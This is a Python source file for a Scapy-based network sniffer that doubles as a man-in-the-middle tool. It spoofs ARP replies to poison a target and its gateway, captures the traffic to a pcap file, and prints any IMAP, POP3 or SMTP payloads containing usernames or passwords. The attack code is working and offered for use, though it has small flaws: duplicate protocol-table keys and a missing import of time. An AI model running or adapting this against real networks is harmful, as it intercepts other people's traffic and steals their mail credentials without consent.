from scapy.all import *
import threading
import signal
import sys

from src.core.reader import read_json
protocols = {
    1: "ICMP",
    2: "IGMP",
    3: "Gateway-to-Gateway Protocol",
    4: "IP in IP Encapsulation",
    6: "TCP",
    17: "UDP",
    47: "General Routing Encapsulation (PPTP data over GRE)",
    51: "AH IPSec",
    50: "ESP IPSec",
    8: "EGP",
    3: "Gateway-Gateway Protocol (GGP)",
    20: "Host Monitoring Protocol (HMP)",
    88: "IGMP",
    66: "MIT Remote Virtual Disk (RVD)",
    89: "OSPF Open Shortest Path First",
    12: "PARC Universal Packet Protocol (PUP)",
    27: "Reliable Datagram Protocol (RDP)",
    89: "Reservation Protocol (RSVP) QoS"
    }

service_guesses = {
    21: "FTP",
    22: "SSH",
    23: "TELNET",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    115: "Simple File Transfer Protocol",
    118: "SQL Services",
    123: "NTP",
    137: "NetBIOS Name Service",
    138: "NetBIOS Datagram Service",
    139: "NetBIOS Session Service",
    143: "IMAP",
    152: "Background File Transfer Protocol (BFTP)",
    156: "SQL Services",
    161: "SNMP",
    194: "IRC",
    199: "SNMP Multiplexing (SMUX)",
    220: "IMAPv3",
    280: "http-mgmt",
    389: "LDAP",
    443: "HTTPS",
    464: "Kerb password change/set",
    500: "ISAKMP/IKE",
    513: "rlogon",
    514: "rshell",
    530: "RPC",
    543: "klogin, Kerberos login",
    544: "kshell, Kerb Remote shell",
    3306: "MySQL",
    5432: "PostgreSQL"
    }

# def format_print(packet_count,proto_name,src,svc_guess_local,dst,svc_guess_remote):
# 
#  
    # print(packet_count,proto_name,src,svc_guess_local,dst,svc_guess_remote)

def get_mac(ip_address):
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
        for s,r in responses:
            return r[Ether].src
        return None

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    print("Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def arp_display(packet):

    if packet[ARP].op == 1: #who-has (request)
        return "Request: " + packet[ARP].psrc + " is asking about " + packet[ARP].pdst
    if packet[ARP].op == 2: #is-at (response)
        return "*Response: " + packet[ARP].hwsrc + " has address " + packet[ARP].psrc

def format_print(packet_count,proto_name,src,svc_guess_local,dst,svc_guess_remote):
   print(packet_count,proto_name,src,svc_guess_local,dst,svc_guess_remote)






class Sniffer:
    def __init__(self) -> None:
        self.values=read_json("config/sniffer.json")
        self.packet_count = 0
        self.INTERFACE = ""
        self.target_ip = ""
        self.target_mac = ""
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.bpf_filter = ""
        self.packet_max = None
        self.poisoning = False
        self.is_poisoned = False
        self.outfile = None
        self.verbose = False
           
    def run(self):
        if self.values["interface"]:
            self.INTERFACE = str(self.values["interface"]).strip()
        if self.values["filename"]:
            self.outfile=self.values["filename"]
        if self.values["filter"]:
            self.bpf_filter = self.values["filter"]
        if self.values["arp"]:
            if not self.INTERFACE:
                print("No interface selected For ARP")
            self.poisoning = True
            try:
                self.gateway_mac= get_mac(self.values["gateway"])
                self.target_mac=get_mac(self.values["target"])
                if self.gateway_mac is None:
                    print(" Failed to get Gateway MAC. Exiting.")
                    exit(1)
                else:
                    print(f'Gateway {self.values["gateway"]} is at {self.gateway_mac}')
                if self.target_mac is None:
                    print("Failed to get Target MAC. Exiting.")
                    exit(1)
                else:
                    print(f'Target {self.values["target"]} is at {self.target_mac}')
                    conf.iface = self.INTERFACE
                    conf.verb=0
                    t = threading.Thread(target=self.poison_target,args=(self.values["gateway"],self.gateway_mac,self.values["target"],self.target_mac))
                    t.daemon = True
                    t.start()
            except Exception as e:
                print(f"ARP poisoning Failed : {e}")
        se = self.INTERFACE or "all interfaces"
        print(f"Beginning Capture on : {se}")
        if self.values["limit"]:
            self.packet_max = int(self.values["limit"])
            print(f"Limiting capture to {self.packet_max} ")
            packets = sniff(filter=self.bpf_filter,
                        iface=self.INTERFACE,
                        prn=self.packet_recv,
                        count=self.packet_max)
            print ("[+] Writing packets to %s" % self.outfile)
            wrpcap(self.outfile, packets)
        else:
            sniff(filter=self.bpf_filter,
            iface=self.INTERFACE,
            prn=self.packet_recv,
            store=0)
    
    def packet_recv(self,packet):
        self.packet_count += 1
        if self.outfile:
            wrpcap(self.outfile, packet, append=True)
        if self.verbose:
            packet.show()
        p = packet[0][1]
        try: # return "[%s] %s Packet: %s (%s) ==> %s (%s)" % (self.packet_count,
        #                                             proto_name,
        #                                             p.src,
        #                                             svc_guess_local,
        #                                             p.dst,
        #                                             svc_guess_remote)
            proto_name = protocols[packet.proto]
        except:
            proto_name = "(unknown)"
        svc_guess_local = self.decode_protocol(p)
        svc_guess_remote = self.decode_protocol(p, False)
        if svc_guess_remote and svc_guess_remote in ["IMAP","POP3","SMTP"]:
            if self.verbose:
                print ("Checking for mail creds")
            self.mail_creds(packet)
        elif ARP in packet:
            if self.verbose:
                print ("ARP packet being sent to ARP specific function")
            arp_display(packet)
        format_print(str(self.packet_count),proto_name,p.src,svc_guess_local,p.dst,svc_guess_remote)
        # return "[%s] %s Packet: %s (%s) ==> %s (%s)" % (self.packet_count,
        #                                             proto_name,
        #                                             p.src,
        #                                             svc_guess_local,
        #                                             p.dst,
        #                                             svc_guess_remote)
        return

    def decode_protocol(self,packet, local=True):
        if local:
            try:
                if packet.sport in service_guesses.keys():
                    # in list. convert to likely name
                    svc_guess = service_guesses[packet.sport]
                else:
                    # not in list, use port nubmer for later analysis
                    svc_guess = str(packet.sport)
            except AttributeError:
                svc_guess = None
        else:
            try:
                if packet.dport in service_guesses.keys():
                    svc_guess = service_guesses[packet.dport]
                else:
                    svc_guess = str(packet.dport)
            except AttributeError:
                svc_guess = None
        return svc_guess

    def mail_creds(self,packet):
        if packet[TCP].payload:
            mail_packet = str(packet[TCP].payload)
            if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
                print ("[+] Server: %s" % packet[IP].dst)
                print ("[+] %s" % packet[TCP].payload)
    
    def poison_target(self,gateway_ip,gateway_mac,target_ip,target_mac):

        poison_target = ARP(op=2,
                            psrc=gateway_ip,
                            pdst=target_ip,
                            hwdst=target_mac)

        poison_gateway = ARP(op=2,
                            psrc=target_ip,
                            pdst=gateway_ip,
                            hwdst=gateway_mac)

        print("Beginning the ARP poisoning.")

        while self.poisoning:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)

        print("ARP poisoning Finished.")
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        return

def sniff_main():
    app=Sniffer()
    app.run()